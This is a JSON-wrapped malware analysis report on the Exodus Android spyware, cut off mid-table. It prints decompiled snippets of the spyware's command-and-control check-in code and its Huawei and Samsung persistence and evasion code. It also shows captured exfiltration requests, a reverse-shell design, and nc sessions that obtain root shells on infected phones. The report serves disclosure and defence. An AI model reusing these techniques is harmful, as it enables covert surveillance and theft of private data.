{
    "id": "2e27dbdf-d196-4936-b1ce-88db0e5bca84",
    "created_at": "2023-01-12T15:04:39.195977Z",
    "updated_at": "2025-03-27T02:16:26.480927Z",
    "deleted_at": null,
    "sha1_hash": "9beb83d67042b5c3e3271bcf95076df368aff5a3",
    "title": "2019-03-29 - Exodus- New Android Spyware Made in Italy",
    "authors": "",
    "file_creation_date": "2022-05-27T21:47:25Z",
    "file_modification_date": "2022-05-27T21:47:25Z",
    "file_size": 2147880,
    "plain_text": "# Exodus: New Android Spyware Made in Italy\n\n**securitywithoutborders.org/blog/2019/03/29/exodus.html**\n\n### Mar 29\n\n[Clicca qui per la versione in Italiano](https://securitywithoutborders.org/blog/2019/03/29/exodus-ita.html)\n\n_Disclaimer: this research was conducted by members and associates of Security Without Borders, independently of any other affiliation_\n_or employer._\n\n## Summary\n\nWe identified a new Android spyware platform we named Exodus, which is composed of two stages we call Exodus One and\n**Exodus Two. We have collected numerous samples spanning from 2016 to early 2019.**\nInstances of this spyware were found on the Google Play Store, disguised as service applications from mobile operators. Both the\nGoogle Play Store pages and the decoys of the malicious apps are in Italian. According to publicly available statistics, as well as\nconfirmation from Google, most of these apps collected a few dozens installations each, with one case reaching over 350.\n**All of the victims are located in Italy. All of these Google Play Store pages have been taken down by Google.**\nWe believe this spyware platform is developed by an Italian company called eSurv, which primarily operates in the business of\nvideo surveillance. According to public records it appears that eSurv began to also develop intrusion software in 2016.\nExodus is equipped with extensive collection and interception capabilities. Worryingly, some of the modifications enforced by the\n**spyware might expose the infected devices to further compromise or data tampering.**\n\n## Disguised Spyware Uploaded on Google Play Store\n\nWe identified previously unknown spyware apps being successfully uploaded on Google Play Store multiple times over the course of\nover two years. These apps would remain available on the Play Store for months and would eventually be re-uploaded.\n\nWhile details would vary, all of the identified copies of this spyware shared a similar disguise. In most cases they would be crafted to\nappear as applications distributed by unspecified mobile operators in Italy. Often the app description on the Play Store would reference\nsome SMS messages the targets would supposedly receive leading them to the Play Store page. All of the Play Store pages we\nidentified and all of the decoys of the apps themselves are written in Italian.\n\n\n-----\n\nAccording to Google, whom we have contacted to alert about our discoveries, nearly 25 variants of this spyware were uploaded on\nGoogle Play Store. Google Play has removed the apps and they stated that \"thanks to enhanced detection models, Google Play Protect\n_will now be able to better detect future variants of these applications\"._\n\nWhile Google did not share with us the total number of infected devices, they confirmed that one of these malicious apps collected over\n350 installations through the Play Store, while other variants collected few dozens each, and that all infections were located in Italy. We\n[have directly observed multiple](https://archive.fo/omfJ8) [copies of Exodus with](https://archive.fo/lzDTN) [more than 50 installs and we can estimate the total number of infections to](https://archive.fo/8KYG7)\n**amount in the several hundreds, if not a thousand or more.**\n\n## Stage 1: Exodus One\n\nThe first stage installed by downloading the malicious apps uploaded on Google Play Store only acts as a dropper. Following are some\nexamples of the decoys used by these droppers:\n\nThe purpose of Exodus One seems to be to collect some basic identifying information about the device (namely the IMEI code and the\nphone number) and send it to the Command & Control server. This is usually done in order to validate the target of a new infection. This\nis further corroborated by some older and unobfuscated samples from 2016, whose primary classes are named `CheckValidTarget .`\n\nDuring our tests the spyware was upgraded to the second stage on our test device immediately after the first check-ins. This\nsuggests that the operators of the Command & Control are not enforcing a validation of the targets. Additionally, during a period of\n**several days, our infected test device was never remotely disinfected by the operators.**\n\nFor the purpose of this report we analyze here the Exodus One sample with hash\n```\n8453ce501fee1ca8a321f16b09969c517f92a24b058ac5b54549eabd58bf1884 which communicated with the Command & Control\n\n```\nserver at `54.71.249.137 . Other samples communicated with other servers listed at the bottom of this report. Exodus One checks-in`\nby sending a POST request containing the app package name, the device IMEI and an encrypted body containing additional device\ninformation.\n\n\n-----\n\n```\n                                               HTTP/1.1\n                                               User-Agent: it.promofferte:[REDACTED]\n                                               Content-Type: application/octet-stream\n                                               Content-Length: 256\n                                               Host: 54.71.249.137\n                                               Connection: Keep-Alive\n                                               Accept-Encoding: gzip\n                                               .....,Q... N.v..us.R.........../...\\D..5p..q \n                                               ......4\n                                               [REDACTED]\n                                               gl.O..Y.Q..)3...7K.:\n                                               (..5...w..........L.....p.L2......._jK.........\n                                               HTTP/1.1 200 OK\n                                               Server: nginx/1.4.6 (Ubuntu)\n                                               Date: [REDACTED]\n                                               Content-Type: text/html; charset=UTF-8\n                                               Transfer-Encoding: chunked\n                                               Connection: keep-alive\n                                               Content-Encoding: gzip\n                                               358fde5fe8f91b132636a6d5a7148070\n\n```\nThe encrypted body is composed of various\nidentifiers which are joined together:\n```\n                                               StringBuilder stringBuilder = new\n                                               StringBuilder();\n                                               stringBuilder.append(\" \");\n                                               stringBuilder.append(\"#\");\n                                               stringBuilder.append(deviceId);\n                                               stringBuilder.append(\"#\");\n                                               stringBuilder.append(str);\n                                               stringBuilder.append(\"#\");\n                                               stringBuilder.append(line1Number);\n                                               stringBuilder.append(\"##\");\n                                               stringBuilder.append(subscriberId);\n                                               stringBuilder.append(\"#\");\n                                               stringBuilder.append(networkOperatorName);\n                                               stringBuilder.append(\"#\");\n                                               stringBuilder.append(networkType);\n                                               stringBuilder.append(\"#\");\n                                               stringBuilder.append(simState);\ndoFinal() is called to encrypt the device information string:\nfinal byte[] doFinal = a3.doFinal(stringBuilder.toString().getBytes());\n\n```\nThe user agent string is built from the package name and IMEI number:\n```\nstringBuilder2.append(this.e.getPackageName());\nstringBuilder2.append(\":\");\nstringBuilder2.append(deviceId);\nsubscriberId = stringBuilder2.toString();\n\n```\nFinally the HTTP request is sent to the server at `https://54.71.249.137/eddd0317-2bdc-4140-86cb-0e8d7047b874 . Many of the`\nstrings in the application are XOR'd with the key `Kjk1MmphFG :`\n```\nStringBuilder stringBuilder3 = new StringBuilder();\nstringBuilder3.append(\"https://\");\nstringBuilder3.append(a);\nstringBuilder3.append(\"/\");\nstringBuilder3.append(p.a(\"Lg4PVX1eQV9rdSkOCBx5XERYa399CQkcfQhIDHF3f10JCXpZ\"));\nfinal Request build = builder.url(stringBuilder3.toString()).header(\"User-Agent\", subscriberId).post(create).build();\n\n```\nAfter some additional requests, the dropper made a POST request to `https://54.71.249.137/56e087c9-fc56-49bb-bbd0-`\n```\n4fafc4acd6e1 which returned a zip file containing the second stage binaries.\n\n```\n\n-----\n\n```\nUser-Agent: it.promofferte:[REDACTED]\nContent-Type: application/octet-stream\nContent-Length: 256\nHost: 54.71.249.137\nConnection: Keep-Alive\nAccept-Encoding: gzip\n......#f......Ri.)\"S.d,....xT...(.L...1.6I.KW9n...Cc@.;....u..4.k...\n\".d...W\n[REDACTED]\n%.+Y..k..}..I....!z...5G...-(.]fc.V..<[y...T..s}.{......u%..[.!89...m..\nHTTP/1.1 200 OK\nServer: nginx/1.4.6 (Ubuntu)\nDate: [REDACTED]\nContent-Type: text/html; charset=UTF-8\nTransfer-Encoding: chunked\nConnection: keep-alive\nContent-Encoding: gzip\nPK.........e[L@..c4'...T......null_armUT  ...D.ZxD.Zux..............|}|....y.%...O`.....f..0..)..P..\n\n## Stage 2: Exodus Two\n\n```\nThe Zip archive returned by the check-in performed by Exodus One is a collection of files including the primary payload `mike.jar and`\nseveral compiled utilities that serve different functions. At least in most recent versions, as of January 2019, the Zip archive would\nactually contain the i686, arm and arm64 versions of all deployed binaries.\n\n**File Name** **Modified Date** **SHA256**\n\nnull_arm 2018-02-27 06:44:00 48a7dd672931e408662d2b5e1abcd6ef00097b8ffe3814f0d2799dd6fd74bd88\n\nnull_i686 2018-02-27 06:44:00 c228a534535b22a316a97908595a2d793d0fecabadc32846c6d1bfb08ca9a658\n\nnull_arm64 2018-02-27 06:43:00 48a7dd672931e408662d2b5e1abcd6ef00097b8ffe3814f0d2799dd6fd74bd88\n\nsepolicy-inject_arm 2019-01-08 04:55:00 47449a612697ad99a6fbd6e02a84e957557371151f2b034a411ebb10496648c8\n\nsepolicy-inject_arm64 2019-01-08 04:55:00 824ad333320cbb7873dc49e61c14f749b0e0d88723635524463f2e6f56ea133a\n\nsepolicy-inject_i686 2019-01-08 04:55:00 13ec6cec511297ac3137cf7d6e4a7c4f5dd2b24478a06262a44f13a3d61070b6\n\nrootdaemon_arm 2019-01-08 04:55:00 00c787c0c0bc26caf623e66373a5aaa1b913b9caee1f34580bdfdd21954b7cc4\n\nrootdaemon_arm64 2019-01-08 04:55:00 3ee3a973c62ba5bd9eab595a7c94b7a26827c5fa5b21964d511ab58903929ec5\n\nmike.jar 2018-12-06 05:50:00 a42a05bf9b412cd84ea92b166d790e8e72f1d01764f93b05ace62237fbabe40e\n\nrootdaemon_i686 2019-01-08 04:55:00 b46f282f9a1bce3798faee3212e28924730a657eb93cda3824c449868b6ee2e7\n\nzygotedaemonarm 2019-01-08 04:55:00 e3f65f84dd6c2c3a5a653a3788d78920c0321526062a6b53daaf23fa57778a5f\n\nzygotedaemonarm64 2019-01-08 04:55:00 11499ff2418f4523344de81a447f6786fdba4982057d4114f64db929990b4b59\n\nzygotedaemoni686 2019-01-08 04:55:00 3c9f08b3280851f54414dfa5a57f40d3b7be7b73736fa0ba21b078e75ce54d33\n\nsapp.apk 2019-01-08 04:53:00 4bf1446c412dd5c552539490d03e999a6ceb96ae60a9e7846427612bec316619\n\nplaceholder 2018-03-29 16:31:00 e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\n\nAfter download, Exodus One would dynamically load and execute the primary stage 2 payload `mike.jar using the Android API`\n[DexClassLoader().](https://developer.android.com/reference/dalvik/system/DexClassLoader) `mike.jar implements most of the data collection and exfiltration capabilities of this spyware.`\n\nOf the various binaries downloaded, the most interesting are `null, which serves as a local and reverse shell, and` `rootdaemon,`\nwhich takes care of privilege escalation and data acquisition. `rootdaemon will first attempt to jailbreak the device using a modified`\nversion of the DirtyCow exploit.\n\n[Similarly to another Android spyware made in Italy, originally discovered by Lukas Stefanko and later named Skygofree and analyzed in](https://twitter.com/LukasStefanko/status/928548460332290048)\ndepth by Kaspersky Labs, Exodus also takes advantage of \"protectedapps\", a feature in Huawei phones that allows to configure powersaving options for running applications. By manipulating a SQLite database, Exodus is able to keep itself running even when the screen\n\n\n-----\n\ngoes off and the application would otherwise be suspended to reduce battery consumption.\n```\nif ( !func_sqlite_loaddb((int)\"/data/data/com.huawei.systemmanager/databases/Optimize.db\", (int)&db_handle) )\n{\n  sprintf(&s, \"INSERT INTO protectedapps (package_name,list_type) VALUES ('%s','1')\", v1, 0);\n  func_sqlite_exec(db_handle, &s, 0, 0, &v4);\n  sprintf(&s, \"DELETE FROM backgroundwhiteapps WHERE package_name='%s'\", v1);\n  func_sqlite_exec(db_handle, &s, 0, 0, &v4);\n  sprintf(&s, \"INSERT INTO backgroundwhiteapps (package_name) VALUES ('%s')\", v1);\n  func_sqlite_exec(db_handle, &s, 0, 0, &v4);\n  func_sqlite_free(v4);\n}\nif ( !func_sqlite_loaddb(\n    (int)\"/data/user_de/0/com.huawei.systemmanager/databases/smartpowerprovider.db\",\n    (int)&db_handle) )\n{\n  sprintf(&s, \"INSERT INTO protectedapps (package_name,list_type) VALUES ('%s','1')\", v2, a2);\n  func_sqlite_exec(db_handle, &s, 0, 0, &v5);\n  sprintf(&s, \"DELETE FROM rogueapps WHERE pkgname='%s'\", v2);\n  func_sqlite_exec(db_handle, &s, 0, 0, &v5);\n  sprintf(&s, \"DELETE FROM superpowerapps WHERE pkgname='%s'\", v2);\n  func_sqlite_exec(db_handle, &s, 0, 0, &v5);\n  sprintf(&s, \"REPLACE INTO unifiedpowerapps (pkg_name,is_protected,is_show,is_changed) VALUES ('%s',1,0,0)\", v2);\n  func_sqlite_exec(db_handle, &s, 0, 0, &v5);\n  func_sqlite_free(v5);\n}\n\n```\nAdditionally, `rootdaemon attempts to remove its own power usage statistics from Huawei phones' SystemManager:`\n```\nif ( !func_sqlite_loaddb((int)\"/data/data/com.huawei.systemmanager/databases/stusagestat.db\", (int)&db_handle) )\n{\n  sprintf(&s, \"REPLACE INTO default_value_table (pkg_name,control,protect,keytask) VALUES ('%s',0,2,0)\", v1, 0);\n  func_sqlite_exec(db_handle, &s, 0, 0, &v4);\n  sprintf(&s, \"DELETE FROM st_key_procs_table WHERE st_key_process='%s'\", v1);\n  func_sqlite_exec(db_handle, &s, 0, 0, &v4);\n  sprintf(&s, \"INSERT INTO st_key_procs_table (st_key_process) VALUES ('%s')\");\n  func_sqlite_exec(db_handle, &s, 0, 0, &v4);\n  sprintf(&s, \"REPLACE INTO st_protected_pkgs_table (pkg_name,is_checked) VALUES ('%s',1)\", v1);\n  func_sqlite_exec(db_handle, &s, 0, 0, &v4);\n  func_sqlite_free(v4);\n}\n\n```\nSimilarly, the malicious application probably attempts to minimize traces on Samsung phones by adding to the file\n```\n/data/data/com.samsung.android.securitylogagent/shared_prefs/apm_sp_status_of_apps.xml the following lines:\n<?xml version='1.0' encoding='utf-8' standalone='yes' ?>\n<map>\n  <int name=\\\"[APP NAME]\\\" value=\\\"33554499\\\" />\n</map>\n\n```\nAnd adding to the file\n```\n/data/data/com.samsung.android.securitylogagent/shared_prefs/com.samsung.android.securitylogagent_preferences.xml\n\n```\nthese lines instead:\n```\n<?xml version='1.0' encoding='utf-8' standalone='yes' ?>\n<map>\n  <boolean name=\\\"[APP NAME]\\\" value=\\\"false\\\" />\n</map>\n\n### Data Collection and Exfiltration\n\n```\nAs mentioned, `mike.jar equips the spyware with extensive collection capabilities, including:`\n\nRetrieve a list of installed applications.\nRecord surroundings using the built-in microphone in 3gp format.\nRetrieve the browsing history and bookmarks from Chrome and SBrowser (the browser shipped with Samsung phones).\nExtract events from the Calendar app.\nExtract the calls log.\nRecord phone calls audio in 3gp format.\nTake pictures with the embedded camera.\nCollect information on surrounding cellular towers (BTS).\nExtract the address book.\nExtract the contacts list from the Facebook app.\n\n\n-----\n\nExtract logs from Facebook Messenger conversations.\nTake a screenshot of any app in foreground.\nExtract information on pictures from the Gallery.\nExtract information from th GMail app.\nDump data from the IMO messenger app.\nExtract call logs, contacts and messages from the Skype app.\nRetrieve all SMS messages.\nExtract messages and the encryption key from the Telegram app.\nDump data from the Viber messenger app.\nExtract logs from WhatsApp.\nRetrieve media exchanged through WhatsApp.\nExtract the Wi-Fi network's password.\nExtract data from WeChat app.\nExtract current GPS coordinates of the phone.\n\nWhile some of these acquisition are performed purely through code in `mike.jar, some others that require access to, for example,`\nSQLite databases or other files in the application's storage are performed through `rootdaemon instead, which should be running with`\nroot privileges. In order to achieve this, `mike.jar connects to` `rootdaemon through various TCP ports that the daemon binds on`\nsome extraction routines for supported applications:\n\nPort 6202: WhatsApp extraction service.\nPorts 6203 and 6204: Facebook extraction service.\nPort 6205: Gmail extraction service.\nPort 6206: Skype extraction service.\nPort 6207: Viber extraction service.\nPort 6208: IMO extraction service.\nPort 6209: Telegram extraction service.\nPort 6210: SBrowser extraction service.\nPort 6211: Calendar extraction service.\nPort 6212: Chrome extraction service.\n\nThese services appear to be running on all network interfaces and are therefore accessible to anyone sharing a local network with an\ninfected device.\n```\n tcp    0   0 0.0.0.0:6201      0.0.0.0:*       LISTEN\n tcp    0   0 0.0.0.0:6205      0.0.0.0:*       LISTEN\n tcp    0   0 0.0.0.0:6209      0.0.0.0:*       LISTEN\n tcp    0   0 0.0.0.0:6211      0.0.0.0:*       LISTEN\n tcp    0   0 0.0.0.0:6212      0.0.0.0:*       LISTEN\n\n```\nFollowing we can see an example of a connection to port 6209 which is used to extract data from the Telegram app. We are able to send\ncommands to the service such as `dumpmsgdb or` `getkey (which dumps the` `tgnet.dat file).`\n```\nuser@laptop:~$ nc 192.168.1.99 6209 | xxd\ngetkey\n00000000: 1f8b 0800 0000 0000 0003 1361 6660 0022 ...........af`.\"\n00000010: 06f3 e995 7bb6 9616 cd04 6126 0604 70b7 ....{.....a&..p.\n00000020: bfb9 e1d2 d959 e741 f220 3e2b 1073 0131 .....Y.A. >+.s.1\n00000030: 2392 1a10 9bcf d0c4 52cf d0d4 44cf d0dc #.......R...D...\n[...]\n00000080: 24d5 02e4 2423 ac4e a2c8 4dcc 686e e247 $...$#.N..M.hn.G\n00000090: 0e27 4303 03c2 e164 4cf5 7062 c117 4e96 .'C....dL.pb..N.\n000000a0: 4484 9309 f5c3 8915 cd4d bc88 7032 d433 D........M..p2.3\n000000b0: 65c0 9f9e d240 8e32 a56a 3801 00c3 3f3c e....@.2.j8...?<\n000000c0: ab18 0300 00 \n\n```\nData acquired from `mike.jar 's extraction modules is normally XORed and stored in a folder named` `.lost+found on the SD card.`\nData is eventually exfiltrated over a TLS connection to the Command & Control server `ws.my-local-weather[.]com through an`\nupload queue.\n\nAs mentioned before, our test device was automatically from stage one to stage two, which started collecting data. For example, the\npassword of the WiFi network used by the phone was stored in the folder `/storage/emulated/0/.lost+found/0BBDA068-9D27-`\n```\n4B55-B226-299FCF2B4242/ using the following file name format DD_MM_2019_HH_mm_ss_XXXXXXXXXXXXX.txt.crypt (the datetime\n\n```\nfollowed by the IMEI). Eventually we observed the agent exfiltrate the WiFi password from our test phone to the Command &\n**Control server:**\n\n\n-----\n\n```\nUser-Agent: it.promofferte:[REDACTED]\nDETAILS: {\"date\":\"[REDACTED]\",\"imei\":\"[REDACTED]\",\"filenameb64\":\"[REDACTED]\\u003d\\u003d\",\"filepathb64\":\"\n[REDACTED]\\u003d\",\"fileDirectoryb64\":\"[REDACTED]\\u003d\",\"uploadType\":\"WIFIPASSWORD\",\"encrypted\":true}\nContent-Type: application/octet-stream\nContent-Length: 277\nHost: ws.my-local-weather.com\nConnection: Keep-Alive\nAccept-Encoding: gzip\nl.9TqRuosV..~.:. ...` [REDACTED] ....s)Sp.^...5z..d0pRu\nHTTP/1.1 200 OK\nServer: nginx\nDate: Fri, 18 Jan 2019 15:53:40 GMT\nContent-Type: text/html; charset=UTF-8\nTransfer-Encoding: chunked\nConnection: keep-alive\nContent-Encoding: gzip\nOK\n\n```\nSimilarly, the agent also sent to the Command & Control the list of installed apps:\n```\nPUT /7d2a863e-5899-4069-9e8e-fd272896d4c7/A35081BD-4016-4C35-AA93-38E09AF77DBA.php HTTP/1.1\nUser-Agent: it.promofferte:[REDACTED]\nDETAILS: {\"date\":\"[REDACTED]\",\"imei\":\"[REDACTED]\",\"filenameb64\":\"[REDACTED]\\u003d\\u003d\",\"filepathb64\":\"\n[REDACTED]\\u003d\\u003d\",\"fileDirectoryb64\":\"[REDACTED]\\u003d\",\"uploadType\":\"APPLIST\",\"encrypted\":true}\nContent-Type: application/octet-stream\nContent-Length: 11502\nHost: ws.my-local-weather.com\nConnection: Keep-Alive\nAccept-Encoding: gzip\n(..5.\"...0...gVE^R.gRT@WYS3^&Q....9.ua8.+WCQ%]T^Q.\n.UYY.R][V.0.5.6...1]0P&.pYM.0AFZ[W~Q[S.\n[REDACTED]\n<...wIwR;.|...2_P.UWTBY_P.FKZR.1P$.7..]6.;E5.&.M_wEPAGP_^xWYR....]a.`\\cG]Dd@c.xS$...<\\[p[]U...\nJh\nHTTP/1.1 200 OK\nServer: nginx\nDate: [REDACTED]\nContent-Type: text/html; charset=UTF-8\nTransfer-Encoding: chunked\nConnection: keep-alive\nContent-Encoding: gzip\n\n```\nThis Command & Control seems to have been active since at least April 2017 and was registered impersonating the legitimate service\n[AccuWeather.](https://www.accuweather.com/)\n```\nRegistrant Name: AccuWeather, Inc.\nRegistrant Organization: AccuWeather, Inc.\nRegistrant Street: 385 SCIENCE PARK RD\nRegistrant City: STATE COLLEGE\nRegistrant State/Province: PA\nRegistrant Postal Code: 16803-2215\nRegistrant Country: US\nRegistrant Phone: +1.8142358528\nRegistrant Phone Ext:\nRegistrant Fax: +1.8142358528\nRegistrant Fax Ext:\nRegistrant Email: accuweather@nycmail[.]com\n\n### Local and Remote Shells\n\n```\nIn order to execute commands on the infected devices, as well as to provide a reverse shell to the Command & Control operators,\n_Exodus Two immediately attempts to execute a payload it downloads with the name_ `null . Once launched,` `null will first verify`\nwhether it is able to fork on the system and that there is no other instance of itself currently running by checking whether the local port\nnumber 6842 is available.\n\nThis payload will then attempt to instantiate a remote reverse `/system/bin/sh shell to the Command & Control` `ws.my-local-`\n```\nweather[.]com on port 22011. It is worth noticing that this remote reverse shell does not employ any transport cryptography. The traffic\n\n```\ntransits in clear and is therefore potentially exposed to man-in-the-middle attacks:\n\n\n-----\n\nAt the same time, `null will also bind a local shell on 0.0.0.0:6842. This local port is used by Exodus Two to execute various`\ncommands on the Android device, such as enabling or disabling certain services, or parsing app databases.\n\nHowever, binding a shell on all available interfaces will obviously make it accessible to anyone who is sharing at least a local network\nwith an infected device. For example, if an infected device is connected to a public Wi-Fi network any other host will be able to\n**obtain a terminal on the device without any form of authentication or verification by simply connecting to the port.**\n```\nuser@laptop:~$ nc 192.168.1.99 6842 -v\nConnection to 192.168.1.99 6842 port [tcp/*] succeeded!\nu0_a114@hammerhead:/ $ id\nid\nuid=10114(u0_a114) gid=10114(u0_a114) groups=1015(sdcard_rw),1028(sdcard_r),3003(inet),50114(all_a114)\ncontext=u:r:untrusted_app:s0\n\n```\nIf the mobile operator doesn't enforce proper client isolation, it is possible that the infected devices are also exposed to the rest of the\ncellular network.\n\nObviously, this inevitably leaves the device open not only to further compromise but to data tampering as well.\n```\nnull is not the only payload opening a shell on the phone. The rootdaemon binary in fact offers several other possibilities to execute\n\n```\ncommands on the infected device just by connecting to TCP port 6200 and issuing one of the following commands.\n\nSending the command `sh to TCP port 6200 results in a full terminal being dropped:`\n```\nuser@laptop:~$ nc 192.168.1.99 6200\nsh\nsystem@hammerhead:/ $ id\nid\nuid=1000(system) gid=1000(system) groups=1015(sdcard_rw),1028(sdcard_r),2000(shell),3003(inet) context=u:r:system:s0\nsystem@hammerhead:/ $\n\n```\nSending the command `cmd followed by a proper terminal command will execute it and print the output (in the example we use` `id`\nwhich displays the identity of the system user running the issued commands):\n```\nuser@laptop:~$ nc 192.168.1.99 6200\ncmd id\nuid=1000(system) gid=1000(system) groups=1015(sdcard_rw),1028(sdcard_r),2000(shell),3003(inet) context=u:r:system:s0\n\n```\nDoing the same as above but with command `sucmd will run the terminal command as root:`\n\n\n-----\n\n```\nsucmd id\nuid=0(root) gid=0(root) groups=1015(sdcard_rw),1028(sdcard_r),2000(shell),3003(inet) context=u:r:system:s0\n\n```\nOther commands supported by `rootdaemon on TCP port 6200 are` `su (which in our tests didn't properly work),` `loadsocketpolicy,`\n```\nloadfilepolicy, remount and removeroot .\n\n```\nAt the cost of possibly being overly verbose, following is the output of an nmap scan of the infected Android device from a laptop in the\nsame local network, which further demonstrantes the availability of the same open TCP ports that we have mentioned thus far:\n```\nuser@laptop:~$ nmap 192.168.1.99 -p6000-7000\nStarting Nmap 7.40 ( https://nmap.org ) at 2019-02-28 17:12 CET\nNmap scan report for android-[REDACTED] (192.168.1.99)\nHost is up (0.035s latency).\nNot shown: 994 closed ports\nPORT   STATE SERVICE\n6200/tcp open lm-x\n6201/tcp open thermo-calc\n6205/tcp open unknown\n6209/tcp open qmtps\n6211/tcp open unknown\n6212/tcp open unknown\n6842/tcp open netmo-http\nNmap done: 1 IP address (1 host up) scanned in 2.30 seconds\n\n## Identification of eSurv\n\n### Presence of Italian language\n\n```\nAt a first look, the first samples of the spyware we obtained did not show immediately evident connections to any company. However, the\npersistent presence of Italian language both on the Google Play Store pages as well as inside the spyware code was a clear sign that an\nItalian actor was behind the creation of this platform. Initially some particular words from the decompiled `classes.dex of Exodus Two`\nsent us in the right direction.\n```\na(\"MUNDIZZA\", \"09081427-FE30-46B7-BFC6-50425D3F85CC\", \".*\", false);\nthis.b.info(\"UPLOADSERVICE Aggiunti i file mundizza. Dimensione coda upload {}\", Integer.valueOf(this.c.size()));\n\n```\n\"Mundizza\" is a dialectal word, a derivative of the proper Italian word \"immondizia\" that translates to \"trash\" or \"garbage\" in English.\nInterestingly, \"mundizza\" is typical of Calabria, a region in the south of Italy, and more specifically it appears to be language native of the\ncity of Catanzaro.\n\nAdditionally, some copies of Exodus One use the following XOR key:\n```\nchar[] cArr = new char[]{'R', 'I', 'N', 'O', ' ', 'G', 'A', 'T', 'T', 'U', 'S', 'O'};\n\n```\nRino Gattuso is a famous retired Italian footballer, originally from Calabria.\n\nWhile not too seriously, these elements made us restrict our research into surveillance companies from the region.\n\n### Overlapping Infrastructure with eSurv Surveillance Cameras\n\nThe Command & Control domain configured in several of the malicious applications found on Google Play Store, `ws.my-local-`\n```\nweather[.]com, points to the IP address 54.69.156.31 which serves a self-signed TLS certificate with the certificate common name\nMyCert and fingerprint\n11:41:45:2F:A7:07:23:54:AE:9A:CE:F4:FE:56:AE:AC:B1:C2:15:9F:6A:FC:1E:CC:7D:F8:61:E3:25:26:73:6A .\n\n```\n[A search for this certificate fingerprint on the Internet scanning service Censys returns 8 additional servers:](https://www.censys.io/)\n\n**IP address**\n\n34.208.71.9\n\n34.212.92.0\n\n34.216.43.114\n\n52.34.144.229\n\n54.69.156.31\n\n\n-----\n\n**IP address**\n\n54.71.249.137\n\n54.189.5.198\n\n78.5.0.195\n\n207.180.245.74\n\nOpening the Command & Control web page in a browser presents a Basic Authentication prompt:\n\nClosing this prompt causes the server to send a \"401 Unauthorized Response\" with an \"Access Denied\" message in Italian.\n\nAll of the other IP address we discovered sharing the same TLS certificate behave in the same way.\n\nThe Command & Control server also displays a favicon image which looks like a small orange ball.\n\n[At the time of writing, a reverse image search for the favicon on Shodan using the query](https://www.shodan.io/) `http.favicon.hash:990643579 returned`\naround 40 web servers which use the same favicon.\n\n\n-----\n\nMany of these servers are control panels for video surveillance systems developed by the Italian company eSurv, based in Catanzaro,\nin Calabria, Italy.\n\n\n-----\n\nTheir [publicly advertised products include CCTV management systems, surveillance drones, face and license plate recognition systems.](https://gfoeurope.it/public/File/Presentazioni%20Perugia/eSurv%20Present.%20GFO%20-%20Giungla%20Digitale%20Perugia.pdf)\n\neSurv's logo is identical to the Command & Control server favicon.\n\n\n-----\n\n### Older samples connecting to eSurv\n\nFinally, Google shared with us some older samples of Exodus One (with hashes\n2055584625d24687bd027a63bc0b8faa7d1a854a535de74afba24840a52b1d2f and\na37f5d2418c5f2f64d06ba28fe62edee1293a56158ddfa9f04020e316054363f) which are not obfuscated and use the following disguise:\n\nThe configuration of these older samples is very similar to newer ones, but it provides additional insights being not obfuscated:\n\n\n-----\n\n```\npublic class Configuration {\n  public static final String BUNDLE_CUSTOM_FILENAME = \"D10CEE67-E1EF-4C17-96DC-BEB51B0A9A55\";\n  public static final String BUNDLE_UNIVERSAL_FILENAME = \"AD9FF676-875E-4294-A230-44EA1A4B15A1\";\n  public static final String CERT_STRING_B64 =\n\"MIIDxzCCAq+gAwIBAgIJAM6NZPKxJWOzMA0GCSqGSIb3DQEBCwUAMHoxCzAJBgNVBAYTAkNOMRYwFAYDVQQIDA1GdW5nIFNoYW5nIEhvMRIwEAYDVQQHDAlIb25nI\n  public static final String EXPLOIT_ARM = \"07DD890F-8495-4E74-826F-BF7AED84B351\";\n  public static final String EXPLOIT_I686 = \"6F6F8F3F-7996-44B4-AD92-4BB03D02D926\";\n  public static final String HOST_DIRECTORY = \"/7e661733-e332-429a-a7e2-23649f27690f/\";\n  public static final String HOST_IP = \"attiva.exodus.esurv.it\";\n  public static final String HOST_WS_BUNDLE1 = \"B45551E5-8B53-4960-8B47-041A46D1B954\";\n  public static final String HOST_WS_BUNDLE2 = \"6AD98532-7605-4DB0-9CE4-56816B203DBD\";\n  public static final String HOST_WS_INIT = \"7acbff64-7a3a-4ebd-8997-4839b5937024\";\n  public static final String KEY_STRING_B64 =\n\"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA7k5xg4sfzLcucmXE24jsI3fJ2+4vt3wVCR0WA3hfqDdlOx7EHWTKues1MLY1Cps8Y3nVId3E7GtzjTTlI\n  public static final String PLACEHOLDER_AFTER_FIRST_EXECUTION = \"5CBAECF0-6D42-430C-99AD-9493EC45C566\";\n  public static final String UNZIPPED_FOLDER = \"BD014144-796E-41B0-89C5-2EEC42765254\";\n}\n\n```\nFirstly we can notice that, instead of generic domain names or IP addresses, these samples communicated with a Command & Control\nserver located at `attiva.exodus.esurv[.]it (\"attiva\" is the Italian for \"activate\").`\n```\npublic static final String HOST_IP = \"attiva.exodus.esurv.it\";\n\n```\n_(We named the spyware \"Exodus\" after this Command & Control domain name.)_\n\nFollowing is the snippet of code in these older Exodus One samples showing the connection to the Command & Control:\n```\nfinal byte[] encryptedBytes = StepOneCipher().doFinal((\" \" + \"#\" + imei + \"#\" + versione + \"#\" + telefono).getBytes());\nfinal Request request = new Request.Builder().url(\"https://attiva.exodus.esurv.it/7e661733-e332-429a-a7e223649f27690f/7acbff64-7a3a-4ebd-8997-4839b5937024.php\").post(RequestBody.create(MTYPE, encryptedBytes)).build();\n\n```\nBelow is the almost identical composition of the request to the Command & Control server in `mike.jar (also containing the path`\n```\n7e661733-e332-429a-a7e2-23649f27690f ):\nif (bArr == null) {\n  bArr = l.c().doFinal((\" \" + \"#\" + deviceId + \"#\" + str3 + \"#\" + telephonyManager.getLine1Number()).getBytes());\n}\nResponse execute = build.newCall(new Request.Builder().url(\"https://ws.my-local-weather[.]com/7e661733-e332-429a-a7e223649f27690f/\" + str2 + \".php\").post(RequestBody.create(a, bArr)).build()).execute();\n\n```\nTo further corroborate the connection of the Exodus spyware with eSurv, the domain `attiva.exodus.esurv.it resolves to the IP`\n212.47.242.236 which, according to public passive DNS data, in 2017 was used to host the domain `server1cs.exodus.connexxa.it .`\nConnexxa was a company also from Catanzaro. According to publicly available information, the founder of Connexxa seems to also be\nthe CEO of eSurv.\n\n[Interestingly, we found other DNS records mostly from 2017 that follow a similar pattern and appear to contain two-letters codes for](http://www.comuni-italiani.it/province.html)\ndistricts in Italy:\n\n**Server** **City**\n\nserver1bo.exodus.connexxa[.]it 